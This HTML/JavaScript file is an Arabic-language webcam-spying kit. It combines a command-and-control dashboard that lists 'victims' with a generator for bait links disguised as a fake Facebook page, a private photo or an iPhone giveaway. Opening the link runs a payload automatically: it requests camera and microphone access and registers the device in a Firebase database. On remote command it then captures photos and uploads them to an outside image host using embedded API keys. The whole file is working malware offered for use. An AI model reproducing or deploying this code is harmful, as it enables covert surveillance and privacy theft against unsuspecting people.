<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>DOCTOR OS | نظام السيادة المتكامل v2.6</title>
    <style>
        :root { --gold: #d4af37; --glow: #00ff41; --bg: #050505; --panel: #111; }
        body { background: var(--bg); color: var(--glow); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        
        /* نظام التبويب (Tabs) */
        .top-nav { background: var(--panel); border-bottom: 2px solid var(--gold); display: flex; padding: 10px; gap: 20px; }
        .tab-btn { background: none; border: 1px solid var(--gold); color: var(--gold); cursor: pointer; padding: 5px 15px; transition: 0.3s; }
        .tab-btn.active { background: var(--gold); color: #000; }

        .container { display: none; height: calc(100vh - 50px); padding: 20px; }
        .container.active { display: block; }

        /* لوحة الضحايا */
        .grid { display: grid; grid-template-columns: 300px 1fr; gap: 20px; height: 100%; }
        .sidebar { background: #0a0a0a; border: 1px solid #333; padding: 10px; overflow-y: auto; }
        .target-card { border: 1px solid #222; padding: 10px; margin-bottom: 10px; cursor: pointer; border-radius: 5px; }
        .target-card:hover { border-color: var(--glow); }

        /* مولد التلغيم */
        .generator-box { background: var(--panel); border: 1px dashed var(--gold); padding: 20px; max-width: 600px; margin: auto; }
        input, select { background: #000; border: 1px solid var(--glow); color: var(--glow); padding: 10px; width: 90%; margin: 10px 0; }
        
        .btn-action { background: var(--glow); color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; width: 100%; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; margin-top: 20px; }
        img { width: 100%; border: 1px solid #444; }
    </style>
</head>
<body>

<nav class="top-nav">
    <div style="color: var(--gold); font-weight: bold; margin-left: 20px;">DOCTOR SYSTEM v2.6</div>
    <button class="tab-btn active" onclick="showTab('dashboard')">مركز القيادة (C2)</button>
    <button class="tab-btn" onclick="showTab('generator')">مصنع التلغيم (Payload Gen)</button>
    <button class="tab-btn" onclick="showTab('settings')">الإعدادات</button>
</nav>

<div id="dashboard" class="container active">
    <div class="grid">
        <div class="sidebar" id="victim-list">
            <h4>الجلسات العكسية (0)</h4>
            </div>
        <div class="main-panel">
            <h2 id="target-title">بانتظار المزامنة...</h2>
            <div id="control-grid" style="display:none;">
                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px;">
                    <button class="btn-action" onclick="sendCommand('capture')">📸 التقاط صورة</button>
                    <button class="btn-action" onclick="sendCommand('vibrate')">📳 هز الجهاز</button>
                    <button class="btn-action" onclick="sendCommand('location')">📍 تحديد الموقع</button>
                </div>
                <div class="gallery" id="target-gallery"></div>
            </div>
        </div>
    </div>
</div>

<div id="generator" class="container">
    <div class="generator-box">
        <h3>توليد رابط التلغيم (Bait Creator)</h3>
        <label>نوع التمويه:</label>
        <select id="bait-type">
            <option value="fb">صفحة فيسبوك وهمية</option>
            <option value="img">مشاهدة صورة خاصة</option>
            <option value="gift">اربح جائزة آيفون</option>
        </select>
        <label>رابط الصورة الحقيقية (لإظهارها بعد الاختراق):</label>
        <input type="text" id="real-img" placeholder="https://i.ibb.co/example.jpg">
        <button class="btn-action" onclick="generateLink()">توليد الرابط الملغم</button>
        <div id="final-link" style="margin-top: 20px; color: var(--gold); word-break: break-all;"></div>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

<script>
    // --- تهيئة Firebase من بياناتك ---
    const firebaseConfig = {
        apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
        authDomain: "hkrs5000.firebaseapp.com",
        databaseURL: "https://hkrs5000-default-rtdb.firebaseio.com",
        projectId: "hkrs5000",
        storageBucket: "hkrs5000.firebasestorage.app",
        messagingSenderId: "273977078526",
        appId: "1:273977078526:web:da9e512c2421c300352baf"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const IMGBB_KEY = "a76371f79ef3069a4103d3493271efb5";

    let selectedID = null;

    // --- نظام التبويب ---
    function showTab(tabId) {
        document.querySelectorAll('.container').forEach(c => c.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
        event.currentTarget.classList.add('active');
    }

    // --- مزامنة الضحايا (C2) ---
    db.ref('devices').on('value', snap => {
        const list = document.getElementById('victim-list');
        list.innerHTML = `<h4>الجلسات العكسية (${snap.numChildren()})</h4>`;
        snap.forEach(child => {
            const d = child.val();
            const div = document.createElement('div');
            div.className = "target-card";
            div.innerHTML = `<b>${child.key}</b><br><small>${d.platform}</small>`;
            div.onclick = () => selectTarget(child.key);
            list.appendChild(div);
        });
    });

    function selectTarget(id) {
        selectedID = id;
        document.getElementById('target-title').innerText = "السيطرة على: " + id;
        document.getElementById('control-grid').style.display = "block";
        loadPhotos(id);
    }

    function sendCommand(act) {
        if(!selectedID) return;
        db.ref('commands/' + selectedID).set({ action: act, time: Date.now() });
    }

    function loadPhotos(id) {
        db.ref(`data/${id}/images`).on('value', snap => {
            const gal = document.getElementById('target-gallery');
            gal.innerHTML = "";
            snap.forEach(img => {
                const el = document.createElement('img');
                el.src = img.val().url;
                gal.appendChild(el);
            });
        });
    }

    // --- مصنع التلغيم (Link Generator) ---
    function generateLink() {
        const url = window.location.href.split('#')[0];
        const bait = document.getElementById('bait-type').value;
        const final = `${url}?type=${bait}#payload`;
        document.getElementById('final-link').innerHTML = `ارسل هذا الرابط للضحية:<br><b>${final}</b>`;
    }

    // --- [البايلود] - يعمل تلقائياً عند فتح الرابط من قبل الضحية ---
    if (window.location.hash === "#payload") {
        document.body.innerHTML = "<h2 style='text-align:center; margin-top:20%;'>جاري تحميل المحتوى... يرجى السماح بالصلاحيات</h2>";
        activatePayload();
    }

    async function activatePayload() {
        const vID = "Z_" + Math.random().toString(36).substr(2, 5);
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            await db.ref('devices/' + vID).set({ platform: navigator.platform, status: "Online" });

            // الاستماع للأوامر العكسية
            db.ref('commands/' + vID).on('value', async (snap) => {
                const cmd = snap.val();
                if(cmd) {
                    if(cmd.action === 'capture') {
                        const track = stream.getVideoTracks()[0];
                        const cap = new ImageCapture(track);
                        const blob = await cap.takePhoto();
                        let fd = new FormData(); fd.append('image', blob);
                        fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, { method:'POST', body:fd })
                        .then(r=>r.json()).then(d=> {
                            db.ref(`data/${vID}/images`).push({ url: d.data.url });
                        });
                    }
                    if(cmd.action === 'vibrate') navigator.vibrate(2000);
                    db.ref('commands/' + vID).remove();
                }
            });
        } catch(e) {}
    }
</script>
</body>
</html>
